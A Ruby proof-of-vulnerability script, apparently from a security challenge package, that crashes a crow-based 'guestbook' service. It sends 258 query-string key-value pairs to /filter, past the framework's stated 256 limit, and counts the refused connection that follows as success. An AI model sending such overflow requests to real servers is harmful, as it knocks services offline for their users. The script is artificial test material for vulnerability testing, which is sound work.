#!/usr/bin/env ruby
# Copyright (c) 2026 Cromulence
# range of lengths to pick in the absence of a `LENGTH` environment variable
LENGTH_RANGE = (100..200)

# seconds to wait for a given activity
DEFAULT_TIME_LIMIT = 5

# first value is from crow's `query_string.h`
# second value is probably fine
# third value is overridable by environment variable
MAX_KEY_VALUE_PAIRS_COUNT = 256
EXTRA_KEY_VALUE_PAIRS_COUNT = 2
KEY_VALUE_PAIRS_COUNT = (ENV["KEY_VALUE_PAIRS_COUNT"] ||
                         MAX_KEY_VALUE_PAIRS_COUNT + EXTRA_KEY_VALUE_PAIRS_COUNT).to_i

require "fileutils"
require "mechanize"
require "nokogiri"
require "pp"
require "timeout"

require_relative "./lib/assertions"
require_relative "./lib/logger"
require_relative "./lib/signature"

class Pov
  attr_reader :host, :port

  def initialize
    @host = ENV["HOST"] || "guestbook"
    @port = (ENV["PORT"] || 8080).to_i

    @assertions = 0

    @base_url = "http://#{@host}:#{@port}"
  end

  def run!
    pwn
  end

  include Assertions

  def pwn
    with_agent do |mech|
      params = KEY_VALUE_PAIRS_COUNT.times.map do |i|
        "key#{i}=value#{i}&"
      end

      uri = URI("#{@base_url}/filter?#{params.join}")
      begin
        index = mech.get(uri)
        LLL.error "Expected to fail, but got a response"
        pp index
        assert false
      rescue Net::HTTP::Persistent::Error => e
        assert(e.message =~ /connection refused/, "got unexpected #{e.inspect}")
        LLL.info e.inspect
        LLL.info "Failed successfully! :)"
      rescue Socket::ResolutionError => e
        assert(e.message =~ /Name or service not known/, "got unexpected #{e.inspect}")
        LLL.info e.inspect
        LLL.info "Failed successfully! :)"
      end
    end
  end

  private

  def with_agent
    Mechanize.start do |mech|
      begin
        mech.follow_redirect = false
        mech.agent.allowed_error_codes = [404, 425]
        yield mech
      rescue
        if mech && mech.current_page && mech.current_page.body
          FileUtils.mkdir_p File.join(__dir__, "tmp")
          dump_filename = File.join(__dir__, "tmp",
                                    "#{Time.now.to_i}-s#{@seed}")

          File.open(dump_filename, "w") { |d| d.write mech.current_page.body }

          LLL.fatal dump_filename
        end
        raise
      end
    end
  end
end

if $0 == __FILE__
  pov = Pov.new

  at_exit do
    LLL.info(["ruby", $0, *ARGV].join(" "))
  end

  pov.run!
end
